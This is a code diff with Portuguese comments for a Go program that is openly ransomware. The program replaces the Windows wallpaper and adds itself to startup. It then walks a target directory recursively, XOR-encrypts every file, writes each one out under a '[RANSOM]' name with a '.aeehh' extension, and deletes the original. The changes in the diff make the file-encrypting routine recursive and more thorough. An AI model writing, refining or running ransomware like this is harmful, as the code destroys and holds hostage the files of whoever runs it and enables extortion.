@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -39,12 +40,12 @@ func setNewWallpaper() error {
 	tempDir := os.TempDir()
 	wallpaperPath := filepath.Join(tempDir, "wallpaper_temp.jpg")
 
-	// Salvar wallpaper no temp
+	// Salvar wallpaper no diretório temporário
 	if err := os.WriteFile(wallpaperPath, wallpaperData, 0644); err != nil {
 		return fmt.Errorf("erro ao salvar wallpaper: %v", err)
 	}
 
-	// Definir wallpaper
+	// Definir o novo wallpaper
 	pathUTF16, err := windows.UTF16PtrFromString(wallpaperPath)
 	if err != nil {
 		return err
@@ -57,11 +58,11 @@ func setNewWallpaper() error {
 		uintptr(spifUpdateIniFile|spifSendWinIniChange),
 	)
 
-	// Remover arquivo temporário
+	// Remover o arquivo temporário
 	os.Remove(wallpaperPath)
 
 	if ret == 0 {
-		return fmt.Errorf("falha ao definir wallpaper")
+		return fmt.Errorf("falha ao definir o wallpaper")
 	}
 	return nil
 }
@@ -83,25 +84,38 @@ func addToStartup() {
 func main() {
 	os.MkdirAll(targetDir, 0755)
 
+	// Alterar wallpaper
 	if err := setNewWallpaper(); err != nil {
 		fmt.Println("[ERRO]", err)
 		return
 	}
 
+	// Adicionar à inicialização
 	addToStartup()
 
-	// Criptografar arquivos (ignora diretórios e arquivos do sistema)
+	// Criptografar arquivos recursivamente (pastas e subpastas)
 	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
-		if err != nil || info.IsDir() {
+		if err != nil || info.IsDir() || strings.HasSuffix(info.Name(), ".aeehh") {
+			return nil // Ignorar erros, diretórios e arquivos já criptografados
+		}
+
+		// Ler arquivo original
+		data, err := os.ReadFile(path)
+		if err != nil {
 			return nil
 		}
 
-		data, _ := os.ReadFile(path)
+		// Criptografar e criar novo arquivo
 		encryptedData := xorEncrypt(data)
-		os.WriteFile(path, encryptedData, 0644)
+		newName := "[RANSOM]" + strings.TrimSuffix(info.Name(), filepath.Ext(info.Name())) + ".aeehh"
+		newPath := filepath.Join(filepath.Dir(path), newName)
 
-		newName := "[RANSOM]" + info.Name() + ".aeehh"
-		os.Rename(path, filepath.Join(filepath.Dir(path), newName))
+		if err := os.WriteFile(newPath, encryptedData, 0644); err != nil {
+			return nil
+		}
+
+		// Remover arquivo original
+		os.Remove(path)
 
 		return nil
 	})
